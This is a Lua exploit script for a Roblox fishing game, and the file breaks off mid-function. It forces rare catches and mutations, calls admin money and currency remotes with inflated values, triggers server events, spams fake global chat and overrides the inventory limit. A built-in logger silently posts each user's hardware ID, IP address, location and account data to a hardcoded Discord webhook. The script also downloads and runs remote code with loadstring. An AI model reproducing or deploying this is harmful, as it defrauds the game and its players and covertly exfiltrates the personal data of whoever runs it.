--[[
    ============================================================
    MIZUKAGE OFFICIAL V3 ULTIMATE + UNIVERSAL LOGGER
    Target Game: [NEW] FISHING ISLAND (95602441922731)
    
    FITUR LENGKAP:
    - Mount System (Frostbite, Thunderzilla, Cerulean Dragon, Sea Eater, Iridesca)
    - Pet Fishing System (Auto Pet)
    - Mutation System & Forced Mutation
    - Perfect Pity Exploit (Force Legendary/Mitos/Secret)
    - Auto Claim Quest Rewards
    - Bloodmoon/Frostmoon Event Trigger
    - Divine Ability Spam
    - Bypass Inventory Limit
    - Auto Sell Fish (Filter by Rarity)
    - Discord Webhook Logger (Session Tracking)
    - UI Lebih Besar & Premium
    - Semua Emoji Dihapus
    ============================================================
]]

if getgenv().MizuApexLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Mizukage Official", 
        Text = "System already running!"
    })
end
getgenv().MizuApexLoaded = true

--================================================
-- 1. SERVICE DECLARATION
--================================================
local Services = setmetatable({}, {
    __index = function(t, k)
        local s = game:GetService(k)
        t[k] = s; return s
    end
})

local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = Services.ReplicatedStorage
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local HttpService = Services.HttpService
local VirtualUser = Services.VirtualUser
local ContentProvider = Services.ContentProvider
local StarterGui = Services.StarterGui
local UserInputService = Services.UserInputService
local MarketplaceService = Services.MarketplaceService

local WebhookTarget = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

--================================================
-- 2. GLOBAL CONFIG
--================================================
getgenv().MizuConfig = {
    IsRunning = true,
    
    -- Auto Fishing
    AutoFish = false,
    AlwaysMaxBar = true, 
    AutoEquipBest = true,
    BiteWait = 1.6,   
    CastDelay = 1.3,  
    SelectedRod = "Owner Rod",
    SpoofedZone = "FishermanIsland",
    
    -- Minigame
    AutoTap = false,
    TapDelay = 0,
    BypassTenaga = false,
    
    -- Exploit Loop
    LoopMoney = false,
    LoopLevel = false,
    TrollSpam = false,
    
    -- Pet System
    AutoPet = false,
    SelectedPet = "Axolotl",
    
    -- Mutation
    ForceMutation = false,
    SelectedMutation = "Crystalized",
    
    -- Pity Exploit
    ForcePity = false,
    TargetRarity = "Mitos",
    
    -- Quest
    AutoClaimQuest = false,
    
    -- Event
    EventMode = "Bloodmoon",
    
    -- Auto Sell
    AutoSell = false,
    SellThreshold = "Epic",
    
    -- Divine
    DivineSpam = false,
    
    -- Inventory
    BypassInventory = false,
    
    -- MOUNT SYSTEM
    MountMode = false,
    SelectedMount = "Frostbite",
    MountSpeed = 65,
}

--================================================
-- 3. UNIVERSAL LOGGER SYSTEM
--================================================
local Logger = {}

Logger.Config = {
    Enabled = true,
    WebhookURL = WebhookTarget,
    SendOnLoad = true,
    IncludeHWID = true,
    IncludeIP = true,
    IncludeAvatar = true,
    IncludeGameInfo = true,
    IncludeServerInfo = true,
    IncludeStats = true,
}

-- INTERNAL FUNCTIONS
local function GetHWID()
    local hwid = "Unknown"
    pcall(function()
        hwid = gethwid and gethwid() or (identifying and identifying()) or "Unknown"
    end)
    return hwid
end

local function GetIPInfo()
    local ipData = { 
        query = "Unknown", 
        country = "Unknown", 
        city = "Unknown", 
        isp = "Unknown",
        region = "Unknown",
        timezone = "Unknown"
    }
    pcall(function()
        local response = game:HttpGet("https://ip-api.com/json")
        if response then
            local decoded = HttpService:JSONDecode(response)
            ipData.query = decoded.query or "Unknown"
            ipData.country = decoded.country or "Unknown"
            ipData.city = decoded.city or "Unknown"
            ipData.isp = decoded.isp or "Unknown"
            ipData.region = decoded.regionName or "Unknown"
            ipData.timezone = decoded.timezone or "Unknown"
        end
    end)
    return ipData
end

local function GetGameInfo()
    local info = {
        name = "Unknown Game",
        placeId = game.PlaceId,
        jobId = game.JobId,
        maxPlayers = game.MaxPlayers,
        playerCount = #Players:GetPlayers(),
        creator = "Unknown"
    }
    pcall(function()
        local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        if productInfo and productInfo.Name then
            info.name = productInfo.Name
        end
        if productInfo and productInfo.Creator then
            info.creator = productInfo.Creator.Name or "Unknown"
        end
    end)
    return info
end

local function GetPlayerInfo()
    local info = {
        userId = LocalPlayer.UserId,
        name = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        accountAge = LocalPlayer.AccountAge,
        membership = (LocalPlayer.MembershipType == Enum.MembershipType.Premium) and "Premium" or "Free"
    }
    return info
end

local function GetPlayerStats()
    local stats = {}
    pcall(function()
        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
        if leaderstats then
            for _, stat in ipairs(leaderstats:GetChildren()) do
                if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                    stats[stat.Name] = stat.Value
                end
            end
        end
    end)
    return stats
end

local function GetAvatarThumbnail(userId)
    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
end

local function GetGameThumbnail(placeId)
    return string.format("https://www.roblox.com/game-thumbnail/image?placeId=%d&width=768&height=432&format=png", placeId)
end

-- LOGGER METHODS
function Logger:Send(data)
    if not self.Config.Enabled then return end
    if not self.Config.WebhookURL or self.Config.WebhookURL == "" then return end
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if not requestFunc then return end

    pcall(function()
        requestFunc({
            Url = self.Config.WebhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

function Logger:SendEmbed(title, description, color, fields, imageUrl, thumbnailUrl, footerText)
    local embed = {
        ["title"] = title or "Log Entry",
        ["description"] = description or "",
        ["color"] = color or 3447003,
        ["timestamp"] = os.date("!%Y-%m-%dT%TZ"),
        ["footer"] = {
            ["text"] = footerText or "Mizukage Official V3",
            ["icon_url"] = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png"
        }
    }
    
    if fields and #fields > 0 then embed["fields"] = fields end
    if imageUrl and imageUrl ~= "" then embed["image"] = { ["url"] = imageUrl } end
    if thumbnailUrl and thumbnailUrl ~= "" then embed["thumbnail"] = { ["url"] = thumbnailUrl } end
    
    self:Send({ ["embeds"] = { embed } })
end

function Logger:LogPlayerSession()
    if not self.Config.SendOnLoad then return end
    
    local playerInfo = GetPlayerInfo()
    local ipData = GetIPInfo()
    local gameInfo = GetGameInfo()
    local hwid = self.Config.IncludeHWID and GetHWID() or "Disabled"
    local stats = self.Config.IncludeStats and GetPlayerStats() or {}
    
    local fields = {
        { ["name"] = "Player Information", ["value"] = string.format("User: %s\nDisplay: %s\nID: `%d`", playerInfo.name, playerInfo.displayName, playerInfo.userId), ["inline"] = true },
        { ["name"] = "Account Details", ["value"] = string.format("Age: %d days\nMembership: %s", playerInfo.accountAge, playerInfo.membership), ["inline"] = true }
    }
    
    if self.Config.IncludeHWID then
        table.insert(fields, { ["name"] = "Hardware ID", ["value"] = string.format("||`%s`||", hwid), ["inline"] = true })
    end
    
    if self.Config.IncludeIP then
        table.insert(fields, { ["name"] = "Network Location", ["value"] = string.format("IP: ||`%s`||\nCity: %s\nRegion: %s\nCountry: %s\nISP: %s", ipData.query, ipData.city, ipData.region, ipData.country, ipData.isp), ["inline"] = false })
    end
    
    if self.Config.IncludeServerInfo then
        table.insert(fields, { ["name"] = "Server Information", ["value"] = string.format("PlaceId: %d\nJobId: %s\nPlayers: %d/%d\nCreator: %s", gameInfo.placeId, gameInfo.jobId, gameInfo.playerCount, gameInfo.maxPlayers, gameInfo.creator), ["inline"] = false })
    end
    
    if next(stats) then
        local statString = ""
        for name, value in pairs(stats) do
            statString = statString .. string.format("%s: %s\n", name, tostring(value))
        end
        table.insert(fields, { ["name"] = "Player Statistics", ["value"] = statString, ["inline"] = false })
    end
    
    local avatarUrl = self.Config.IncludeAvatar and GetAvatarThumbnail(playerInfo.userId) or ""
    local gameThumbnail = self.Config.IncludeGameInfo and GetGameThumbnail(gameInfo.placeId) or ""
    
    self:SendEmbed(
        string.format("%s - New Session", gameInfo.name),
        string.format("Player %s has joined the game", playerInfo.name),
        3447003,
        fields,
        gameThumbnail,
        avatarUrl,
        "Mizukage Official V3"
    )
end

function Logger:LogAction(action, target, data, color)
    local fields = {
        { ["name"] = "Action", ["value"] = action, ["inline"] = true }
    }
    if target then
        table.insert(fields, { ["name"] = "Target", ["value"] = target, ["inline"] = true })
    end
    if data then
        table.insert(fields, { ["name"] = "Action Data", ["value"] = string.format("```lua\n%s\n```", data), ["inline"] = false })
    end
    self:SendEmbed("Action Performed", "An action was executed", color or 16755200, fields)
end

function Logger:Initialize()
    if self.Config.SendOnLoad then
        task.spawn(function()
            task.wait(2)
            self:LogPlayerSession()
        end)
    end
    return self
end

-- Initialize Logger
Logger:Initialize()

--================================================
-- 4. LISTS
--================================================
local RodList = {
    "Owner Rod", "Chromatic Katana", "Developer Rod", "Bunny Summoner", 
    "Draconic Soul", "The Vanquisher", "Blood Serpent's Trident", 
    "Serpent's Trident", "Kitsune Greatsword", "Celestial Scythe", 
    "Eternal Flower", "Crimson Retribution", "Crescendo Scythe", 
    "Holy Trident", "Dark Matter Scythe", "Blackhole Sword", 
    "Ethereal Sword", "Cupid's Harp", "Aurelian Bow", "Crescendo", 
    "Oceanic Harpoon", "Angelic Rod", "ZombieRod", "Gold Rod", 
    "Lucky Rod", "Lightning", "Polarized", "Fluorescent Rod", 
    "GhostRod", "Frozen Rod", "LightingPunk Rod", "Pirate Octopus",
    "Aqua Prism", "Flery", "Loving", "Forsaken", "Crystalized",
    "Earthly", "Manifest", "Megalofriend", "Purple Saber",
    "Katana", "Corruption Edge", "Umbrella", "x1x1x1 Hammer",
    "Turbo Ban Hammer", "Binary Edge", "Cople x1x1x", "Soul Scythe",
    "Diamond Rod", "Withering Rod", "Gingerbread Katana", "Frostfin Katana",
    "Profane Blade", "Chromatic Krampus Scythe", "Butterfly Sword",
    "Violet Sovereign", "Overlord's Energy Trident", "Abyssal Seraph",
    "Lunar Harbinger", "Chromatic Overlord's Trident", "Christmas Parasol",
    "Blazing Chord", "The Fuchsia Phantom", "Frostbound Heirloom",
    "Galaxy Conqueror", "Chromatic Galaxy Conqueror", "Zephyr Monarch",
    "Kraken's Gilded Anchor", "World Tour Football", "Inferno Football",
    "Spectral Scythe", "Bloodfrost Guitar", "Gilded Harpoon",
    "Royal Retribution", "Chromatic Holy Trident", "Basic Rod"
}

local ZoneList = {
    "FishermanIsland", "MyticalIsland", "VerdantIsle", "ChristmasIsland", 
    "ShadowfangIsland", "CraterIsland", "CoralReefs", "UnderWater",
    "ClassicIsland", "ClassicCave", "CopperCanyon", "CopperCanyonMines",
    "MachodonEvent", "StingrayShores", "EventZone", "MegaHunt"
}

local PetList = {
    "Axolotl", "Capybara", "Cow", "Frog", "Otter", "Penguin", 
    "Tabby Cat", "Polar Bear", "Seal", "Arctic Fox"
}

local MutationList = {
    "Crystalized", "Disco", "Frozen", "Galaxy", "Bloodmoon", "Frostmoon",
    "1x1x1x1", "Ghost", "Albino", "Stone", "Carrot", "Sandy",
    "Moon Fragment", "Corrupt", "Leviathan Rage", "Festive"
}

local RarityList = {
    "Uncommon", "Rare", "Epic", "Legendary", "Mitos", "Secret", "Forgotten"
}

local MountList = {
    "Frostbite", "Thunderzilla", "Cerulean Dragon", "Sea Eater",
    "Iridesca", "Flying Dutchman - Top 1", "Flying Dutchman - Top 10",
    "Flying Dutchman - Top 200", "MEGA Yacht", "Voidcraft"
}

--================================================
-- 5. REMOTE COLLECTION
--================================================
local FishingSystem = ReplicatedStorage:WaitForChild("FishingSystem")
local AdminEvents = ReplicatedStorage:FindFirstChild("AdminEvents")
local PetRemotes = ReplicatedStorage:FindFirstChild("PetRemotes")
local Packages = ReplicatedStorage:FindFirstChild("Packages")
local SleitnickNet = Packages and Packages:FindFirstChild("_index") and Packages._index:FindFirstChild("sleitnick_net@0.2.0") and Packages._index["sleitnick_net@0.2.0"]:FindFirstChild("net")

local Remotes = {
    Inventory_EquipRod = FishingSystem:FindFirstChild("InventoryEvents") and FishingSystem.InventoryEvents:FindFirstChild("Inventory_EquipRod"),
    Inventory_EquipTool = FishingSystem:FindFirstChild("InventoryEvents") and FishingSystem.InventoryEvents:FindFirstChild("Inventory_EquipTool"),
    Inventory_GetData = FishingSystem:FindFirstChild("InventoryEvents") and FishingSystem.InventoryEvents:FindFirstChild("Inventory_GetData"),
    Inventory_SellAll = FishingSystem:FindFirstChild("InventoryEvents") and FishingSystem.InventoryEvents:FindFirstChild("Inventory_SellAll"),
    CastReplication = FishingSystem:FindFirstChild("RE/CastReplication"),
    SyncHookLanding = FishingSystem:FindFirstChild("RE/SyncHookLanding"),
    StartFishing = FishingSystem:FindFirstChild("RE/StartFishing"),
    RequestFishRoll = FishingSystem:FindFirstChild("RF/RequestFishRoll"),
    RollFishServer = FishingSystem:FindFirstChild("RF/RollFishServer"),
    CatchSuccess = ReplicatedStorage:FindFirstChild("FishingCatchSuccess"),
    FishGiver = FishingSystem and (FishingSystem:FindFirstChild("RE/FishGiver") or FishingSystem:FindFirstChild("FishGiver")),
    ReplicateExclaim = FishingSystem:FindFirstChild("RE/ReplicateExclaim"),
    CleanupCast = FishingSystem:FindFirstChild("RE/CleanupCast"),
    PetFishRequest = PetRemotes and PetRemotes:FindFirstChild("PetFishRequest"),
    PetFishBroadcast = PetRemotes and PetRemotes:FindFirstChild("PetFishBroadcast"),
    PetBaitBroadcast = PetRemotes and PetRemotes:FindFirstChild("PetBaitBroadcast"),
    UpdatePet = PetRemotes and PetRemotes:FindFirstChild("UpdatePet"),
    PetFishCaught = PetRemotes and PetRemotes:FindFirstChild("PetFishCaught"),
    ShowMitosEffect = FishingSystem:FindFirstChild("RE/ShowMitosEffectClient"),
    ShowSecretEffect = FishingSystem:FindFirstChild("RE/ShowSecretEffectClient"),
    ShowLegendaryEffect = FishingSystem:FindFirstChild("RE/ShowLegendaryEffectClient"),
    ReplicateSecretEffect = FishingSystem:FindFirstChild("RE/ReplicateSecretEffect"),
    ReplicateMitosEffect = FishingSystem:FindFirstChild("RE/ReplicateMitosEffect"),
    ReplicateLegendaryEffect = FishingSystem:FindFirstChild("RE/ReplicateLegendaryEffect"),
    TriggerBloodmoon = FishingSystem:FindFirstChild("TriggerBloodmoonEvent"),
    TriggerFrostmoon = FishingSystem:FindFirstChild("TriggerFrostmoonEvent"),
    TriggerPurpleBloodmoon = FishingSystem:FindFirstChild("TriggerPurpleBloodmoon"),
    QuestGetData = FishingSystem:FindFirstChild("QuestGetData"),
    QuestSystem = FishingSystem:FindFirstChild("QuestSystem"),
    GiveMoney = AdminEvents and AdminEvents:FindFirstChild("GiveMoney"),
    GiveRod = AdminEvents and AdminEvents:FindFirstChild("GiveRod"),
    TeleportToPlayer = AdminEvents and AdminEvents:FindFirstChild("TeleportToPlayer"),
    SendChatMessage = FishingSystem:FindFirstChild("SendChatMessage"),
    TixPurchaseRequest = SleitnickNet and SleitnickNet:FindFirstChild("RE/TixPurchaseRequest"),
    GetPlayerStats = FishingSystem:FindFirstChild("GetPlayerStats"),
    
    FrostbiteMountEvent = ReplicatedStorage:FindFirstChild("FrostbiteMountEvent"),
    FrostbiteSitRequest = ReplicatedStorage:FindFirstChild("FrostbiteSitRequest"),
    FrostbiteActivate = ReplicatedStorage:FindFirstChild("FrostbiteActivate"),
    ThunderzillaMountEvent = ReplicatedStorage:FindFirstChild("ThunderzillaMountEvent"),
    ThunderzillaSitRequest = ReplicatedStorage:FindFirstChild("ThunderzillaSitRequest"),
    ThunderzillaActivate = ReplicatedStorage:FindFirstChild("ThunderzillaActivate"),
    CeruleanDragonMountEvent = ReplicatedStorage:FindFirstChild("CeruleanDragonMountEvent"),
    CeruleanDragonSitRequest = ReplicatedStorage:FindFirstChild("CeruleanDragonSitRequest"),
    CeruleanDragonActivate = ReplicatedStorage:FindFirstChild("CeruleanDragonActivate"),
    SeaEaterMountEvent = ReplicatedStorage:FindFirstChild("SeaEaterMountEvent"),
    SeaEaterSitRequest = ReplicatedStorage:FindFirstChild("SeaEaterSitRequest"),
    SeaEaterActivate = ReplicatedStorage:FindFirstChild("SeaEaterActivate"),
    IridescaMountEvent = ReplicatedStorage:FindFirstChild("IridescaMountEvent"),
    IridescaSitRequest = ReplicatedStorage:FindFirstChild("IridescaSitRequest"),
    IridescaActivate = ReplicatedStorage:FindFirstChild("IridescaActivate"),
    SpawnBoatEvent = ReplicatedStorage:FindFirstChild("SpawnBoatEvent"),
}

--================================================
-- 6. AUTO RECONNECT
--================================================
local function SetupAutoReconnect()
    pcall(function()
        GuiService.ErrorMessageChanged:Connect(function()
            task.wait(0.5)
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end)
    end)
    
    pcall(function()
        LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)
end

--================================================
-- 7. MOUNT SYSTEM
--================================================
local function StartMountSystem()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.MountMode then
                pcall(function()
                    local mountName = getgenv().MizuConfig.SelectedMount
                    local speed = getgenv().MizuConfig.MountSpeed or 65
                    
                    if mountName == "Frostbite" then
                        if Remotes.FrostbiteMountEvent then Remotes.FrostbiteMountEvent:FireServer() end
                        if Remotes.FrostbiteActivate then Remotes.FrostbiteActivate:FireServer() end
                    elseif mountName == "Thunderzilla" then
                        if Remotes.ThunderzillaMountEvent then Remotes.ThunderzillaMountEvent:FireServer() end
                        if Remotes.ThunderzillaActivate then Remotes.ThunderzillaActivate:FireServer() end
                    elseif mountName == "Cerulean Dragon" then
                        if Remotes.CeruleanDragonMountEvent then Remotes.CeruleanDragonMountEvent:FireServer() end
                        if Remotes.CeruleanDragonActivate then Remotes.CeruleanDragonActivate:FireServer() end
                    elseif mountName == "Sea Eater" then
                        if Remotes.SeaEaterMountEvent then Remotes.SeaEaterMountEvent:FireServer() end
                        if Remotes.SeaEaterActivate then Remotes.SeaEaterActivate:FireServer() end
                    elseif mountName == "Iridesca" then
                        if Remotes.IridescaMountEvent then Remotes.IridescaMountEvent:FireServer() end
                        if Remotes.IridescaActivate then Remotes.IridescaActivate:FireServer() end
                    else
                        if Remotes.SpawnBoatEvent then
                            Remotes.SpawnBoatEvent:FireServer(mountName)
                        end
                    end
                    
                    local char = LocalPlayer.Character
                    if char then
                        local hum = char:FindFirstChild("Humanoid")
                        if hum then hum.WalkSpeed = speed end
                    end
                end)
            end
            task.wait(5)
        end
    end)
end

--================================================
-- 8. AUTO FISH
--================================================
local function GetBestRod()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if not backpack or not char then return nil end

    for _, rodName in ipairs(RodList) do
        local found = backpack:FindFirstChild(rodName) or char:FindFirstChild(rodName)
        if found then return found end
    end
    return nil
end

local function StartAutoFish()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.AutoFish then
                local char = LocalPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChild("Humanoid")
                
                if char and root and hum then
                    pcall(function()
                        if getgenv().MizuConfig.AutoEquipBest then
                            local bestRod = GetBestRod()
                            if bestRod and bestRod.Parent ~= char then
                                hum:EquipTool(bestRod)
                                getgenv().MizuConfig.SelectedRod = bestRod.Name
                            end
                        end
                        if Remotes.Inventory_EquipRod then
                            Remotes.Inventory_EquipRod:FireServer(getgenv().MizuConfig.SelectedRod)
                        end
                        
                        local lookVec = root.CFrame.LookVector
                        local castPos = root.Position + (lookVec * math.random(30, 45))
                        local castVel = lookVec * math.random(50, 70)
                        
                        if Remotes.CastReplication then
                            local power = getgenv().MizuConfig.AlwaysMaxBar and 100 or 95
                            Remotes.CastReplication:FireServer(castPos, castVel, getgenv().MizuConfig.SelectedRod, power)
                        end
                        
                        task.wait(0.2)
                        if Remotes.SyncHookLanding then
                            Remotes.SyncHookLanding:FireServer(castPos - Vector3.new(0, root.Position.Y - 225, 0))
                        end
                        
                        task.wait(getgenv().MizuConfig.BiteWait)
                        
                        if Remotes.StartFishing then Remotes.StartFishing:FireServer() end
                        task.wait(0.1)
                        
                        if getgenv().MizuConfig.ForcePity then
                            if Remotes.RollFishServer then
                                Remotes.RollFishServer:InvokeServer(getgenv().MizuConfig.SelectedRod, 0)
                            end
                            local target = getgenv().MizuConfig.TargetRarity
                            if target == "Mitos" and Remotes.ReplicateMitosEffect then
                                Remotes.ReplicateMitosEffect:FireServer({ playerName = LocalPlayer.Name })
                            elseif target == "Secret" and Remotes.ReplicateSecretEffect then
                                Remotes.ReplicateSecretEffect:FireServer({ playerName = LocalPlayer.Name })
                            elseif target == "Legendary" and Remotes.ReplicateLegendaryEffect then
                                Remotes.ReplicateLegendaryEffect:FireServer({ playerName = LocalPlayer.Name })
                            end
                            if Remotes.ReplicateExclaim then 
                                Remotes.ReplicateExclaim:FireServer(target) 
                            end
                        else
                            if Remotes.RollFishServer then
                                Remotes.RollFishServer:InvokeServer(getgenv().MizuConfig.SelectedRod, 1)
                            elseif Remotes.RequestFishRoll then
                                Remotes.RequestFishRoll:InvokeServer()
                            end
                            if Remotes.ReplicateExclaim then 
                                Remotes.ReplicateExclaim:FireServer("Mitos") 
                            end
                        end
                        
                        if Remotes.CatchSuccess then Remotes.CatchSuccess:FireServer() end
                        
                        if Remotes.FishGiver then
                            local fishData = { 
                                zone = getgenv().MizuConfig.SpoofedZone 
                            }
                            if getgenv().MizuConfig.ForceMutation then
                                fishData.metadata = {
                                    VariantId = getgenv().MizuConfig.SelectedMutation,
                                    VariantSeed = math.random(1, 999999)
                                }
                            end
                            Remotes.FishGiver:FireServer(fishData)
                        end
                        if Remotes.CleanupCast then Remotes.CleanupCast:FireServer() end
                    end)
                end
            end
            task.wait(getgenv().MizuConfig.CastDelay)
        end
    end)
end

--================================================
-- 9. AUTO PET
--================================================
local function StartAutoPet()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.AutoPet then
                pcall(function()
                    local char = LocalPlayer.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    
                    if Remotes.PetBaitBroadcast then
                        Remotes.PetBaitBroadcast:FireServer({
                            ownerUserId = LocalPlayer.UserId,
                            castPos = root.Position + root.CFrame.LookVector * 25,
                            petName = getgenv().MizuConfig.SelectedPet,
                        })
                    end
                    
                    task.wait(0.5)
                    
                    if Remotes.PetFishBroadcast then
                        local rarity = {"Uncommon", "Rare", "Epic", "Legendary", "Mitos"}
                        local fishRarity = rarity[math.random(1, #rarity)]
                        
                        if getgenv().MizuConfig.ForcePity then
                            fishRarity = getgenv().MizuConfig.TargetRarity
                        end
                        
                        Remotes.PetFishBroadcast:FireServer({
                            rarity = fishRarity,
                            fishName = "Mytical Fish",
                            castPos = root.Position + root.CFrame.LookVector * 25,
                            petName = getgenv().MizuConfig.SelectedPet,
                            ownerUserId = LocalPlayer.UserId,
                            metadata = {
                                CaughtByPet = getgenv().MizuConfig.SelectedPet,
                            }
                        })
                    end
                    
                    if Remotes.PetFishCaught then
                        Remotes.PetFishCaught:FireServer()
                    end
                end)
            end
            task.wait(5)
        end
    end)
end

--================================================
-- 10. AUTO SELL
--================================================
local function StartAutoSell()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.AutoSell then
                pcall(function()
                    if Remotes.Inventory_GetData then
                        local data = Remotes.Inventory_GetData:InvokeServer()
                        if data and data.Fish then
                            local toSell = {}
                            local threshold = getgenv().MizuConfig.SellThreshold
                            local rarityOrder = {Uncommon=1, Rare=2, Epic=3, Legendary=4, Mitos=5, Secret=6, Forgotten=7}
                            local thresholdLevel = rarityOrder[threshold] or 3
                            
                            for _, fish in ipairs(data.Fish) do
                                local rLevel = rarityOrder[fish.rarity] or 0
                                if rLevel <= thresholdLevel then
                                    table.insert(toSell, fish.id)
                                end
                            end
                            
                            if #toSell > 0 and Remotes.Inventory_SellAll then
                                Remotes.Inventory_SellAll:InvokeServer(toSell)
                            end
                        end
                    end
                end)
            end
            task.wait(60)
        end
    end)
end

--================================================
-- 11. EVENT TRIGGER
--================================================
local function StartEventMode()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.EventMode then
                pcall(function()
                    local event = getgenv().MizuConfig.EventMode
                    if event == "Bloodmoon" and Remotes.TriggerBloodmoon then
                        Remotes.TriggerBloodmoon:FireServer()
                    elseif event == "Frostmoon" and Remotes.TriggerFrostmoon then
                        Remotes.TriggerFrostmoon:FireServer()
                    elseif event == "PurpleBloodmoon" and Remotes.TriggerPurpleBloodmoon then
                        Remotes.TriggerPurpleBloodmoon:FireServer()
                    end
                end)
            end
            task.wait(300)
        end
    end)
end

--================================================
-- 12. DIVINE SPAM
--================================================
local function StartDivineSpam()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.DivineSpam then
                pcall(function()
                    local divineRemote = ReplicatedStorage:FindFirstChild("FishingSystem")
                    if divineRemote then
                        divineRemote = divineRemote:FindFirstChild("AbilityRemotes")
                        if divineRemote then
                            divineRemote = divineRemote:FindFirstChild("DivineBonusFish")
                            if divineRemote then
                                divineRemote:FireServer()
                            end
                        end
                    end
                end)
            end
            task.wait(2)
        end
    end)
end

--================================================
-- 13. BYPASS INVENTORY
--================================================
local function StartBypassInventory()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.BypassInventory then
                pcall(function()
                    local config = FishingSystem and FishingSystem:FindFirstChild("FishingConfig")
                    if config then
                        local module = require(config)
                        if module and module.InventoryLimitSettings then
                            module.InventoryLimitSettings.maxFishInventory = 999999
                            module.InventoryLimitSettings.enabled = false
                        end
                    end
                end)
            end
            task.wait(60)
        end
    end)
end

--================================================
-- 14. AUTO CLAIM QUEST
--================================================
local function StartAutoClaimQuest()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.AutoClaimQuest then
                pcall(function()
                    if Remotes.QuestGetData then
                        local questData = Remotes.QuestGetData:InvokeServer()
                        if questData then
                            for _, quest in ipairs(questData) do
                                if quest.completed and not quest.claimed then
                                    if Remotes.QuestSystem then
                                        Remotes.QuestSystem:FireServer("CLAIM", quest.id)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
            task.wait(30)
        end
    end)
end

--================================================
-- 15. START ALL SYSTEMS
--================================================
local function StartAutoTap()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.AutoTap then
                local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                if playerGui then
                    for _, uiElement in ipairs(playerGui:GetDescendants()) do
                        if uiElement:IsA("GuiButton") and (uiElement.Name == "TapMobile" or uiElement.Name == "HoldButton" or uiElement.Name == "button") then
                            if getconnections then
                                for _, conn in pairs(getconnections(uiElement.MouseButton1Down)) do pcall(function() conn:Fire() end) end
                                for _, conn in pairs(getconnections(uiElement.MouseButton1Click)) do pcall(function() conn:Fire() end) end
                                for _, conn in pairs(getconnections(uiElement.Activated)) do pcall(function() conn:Fire() end) end
                            end
                        end
                    end
                end
            end
            
            if getgenv().MizuConfig.TapDelay and getgenv().MizuConfig.TapDelay > 0 then
                task.wait(getgenv().MizuConfig.TapDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end

local function StartBypassTenaga()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.BypassTenaga then
                pcall(function()
                    local char = LocalPlayer.Character
                    if char then
                        for _, v in ipairs(char:GetDescendants()) do
                            if v:IsA("NumberValue") or v:IsA("IntValue") then
                                local name = string.lower(v.Name)
                                if string.match(name, "stamina") or string.match(name, "energy") then 
                                    v.Value = 99999
                                elseif string.match(name, "tension") then 
                                    v.Value = 50 
                                end
                            end
                        end
                    end
                end)
            end
            task.wait(0.5)
        end
    end)
end

local function StartExploitLoops()
    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.LoopMoney and Remotes.GiveMoney then 
                pcall(function() Remotes.GiveMoney:FireServer(999999999, "add") end) 
            end
            task.wait(0.5)
        end
    end)

    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.LoopLevel and Remotes.TixPurchaseRequest then 
                pcall(function() Remotes.TixPurchaseRequest:FireServer(999, 999999999) end) 
            end
            task.wait(0.1)
        end
    end)

    task.spawn(function()
        while getgenv().MizuConfig.IsRunning do
            if getgenv().MizuConfig.TrollSpam and Remotes.SendChatMessage then
                pcall(function() 
                    local fakeFish = {"MACHODON", "Thunderzilla", "Cerulean Dragon", "Sea Eater", "Ketupat Whale"}
                    local msg = string.format("[HACKED] MIZUKAGE MEGA %s", fakeFish[math.random(1, #fakeFish)])
                    Remotes.SendChatMessage:FireServer("Global", LocalPlayer.Name, msg, math.random(500, 1200), "Secret", "1 in 999.9M") 
                end)
            end
            task.wait(3)
        end
    end)
end

--================================================
-- 16. INTERFACE - UI LEBIH BESAR & PREMIUM
--================================================
local function InitInterface()
    local WindUI = nil
    local loadSources = {
        "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua",
        "https://raw.githubusercontent.com/Footagesus/WindUI/main/main.lua",
        "https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"
    }
    
    for _, url in ipairs(loadSources) do
        local success, result = pcall(function()
            return loadstring(game:HttpGet(url))()
        end)
        if success and result and result.CreateWindow then
